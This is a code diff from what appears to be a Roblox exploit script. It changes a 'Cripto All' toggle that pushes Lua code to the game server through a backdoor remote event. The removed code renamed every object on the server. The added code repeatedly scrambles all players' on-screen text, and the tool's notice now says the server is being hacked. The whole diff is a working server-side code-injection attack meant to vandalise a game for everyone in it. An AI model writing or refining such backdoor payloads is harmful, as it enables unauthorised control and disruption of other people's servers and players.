@@ -328,59 +328,56 @@ grpServer:CreateToggle({Name = "Map Rainbow", Icon = "palette", Default = false,
     end
 end})
 
--- CRYPTO: SÓ RENOMEIA TUDO (SEM DELETAR, SEM MEXER NA FÍSICA)
+-- CRYPTO: SÓ TEXTO DA GUI, NÃO MEXE NO MAPA, NÃO MATA
 grpServer:CreateToggle({Name = "Cripto All", Icon = "terminal", Default = false, Callback = function(state)
     if not backdoorRemote then return end
     if state then
         local code = [[
             _G.MI_Crypto = true
-            local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-            
-            local function scramble(len)
+            local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
+            local function scramble(str)
                 local out = {}
-                for i = 1, len do
-                    local n = math.random(1, #chars)
-                    out[i] = chars:sub(n, n)
+                for i = 1, #str do
+                    local r = math.random(1, #chars)
+                    out[i] = chars:sub(r, r)
                 end
                 return table.concat(out)
             end
 
             task.spawn(function()
                 while _G.MI_Crypto do
-                    local function renameObj(obj)
-                        if not obj then return end
-                        pcall(function()
-                            if obj.Name ~= "Humanoid" and obj.Name ~= "HumanoidRootPart" and obj.Name ~= "Camera" and obj.Name ~= "Terrain" and obj.Name ~= "Baseplate" then
-                                obj.Name = scramble(15)
+                    for _, p in ipairs(game.Players:GetPlayers()) do
+                        local pg = p:FindFirstChild("PlayerGui")
+                        if pg then
+                            for _, gui in ipairs(pg:GetDescendants()) do
+                                if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                                    if not gui:GetAttribute("MI_OrigText") then
+                                        gui:SetAttribute("MI_OrigText", gui.Text)
+                                    end
+                                    pcall(function() gui.Text = scramble(gui:GetAttribute("MI_OrigText")) end)
+                                end
                             end
-                        end)
-                        for _, c in ipairs(obj:GetChildren()) do
-                            pcall(renameObj, c)
                         end
                     end
-
-                    pcall(renameObj, workspace)
-                    pcall(renameObj, game:GetService("Lighting"))
-                    pcall(renameObj, game:GetService("ReplicatedStorage"))
-                    pcall(renameObj, game:GetService("StarterGui"))
-                    pcall(renameObj, game:GetService("StarterPack"))
-                    pcall(renameObj, game:GetService("ServerStorage"))
                     
-                    for _, p in ipairs(game.Players:GetPlayers()) do
-                        pcall(renameObj, p)
-                        if p.Character then pcall(renameObj, p.Character) end
-                        local pg = p:FindFirstChild("PlayerGui")
-                        if pg then pcall(renameObj, pg) end
-                        local bp = p:FindFirstChild("Backpack")
-                        if bp then pcall(renameObj, bp) end
-                    end
+                    pcall(function()
+                        local cg = game:GetService("CoreGui")
+                        for _, gui in ipairs(cg:GetDescendants()) do
+                            if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                                if not gui:GetAttribute("MI_OrigText") then
+                                    gui:SetAttribute("MI_OrigText", gui.Text)
+                                end
+                                gui.Text = scramble(gui:GetAttribute("MI_OrigText"))
+                            end
+                        end
+                    end)
                     
-                    task.wait(0.05)
+                    task.wait(0.01)
                 end
             end)
         ]]
         pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
-        win:Notify({Title = "Cripto", Content = "Renomeando tudo no servidor.", Duration = 3})
+        win:Notify({Title = "Cripto", Content = "Servidor sendo hackeado.", Duration = 3})
     else
         local code = [[ _G.MI_Crypto = false ]]
         pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
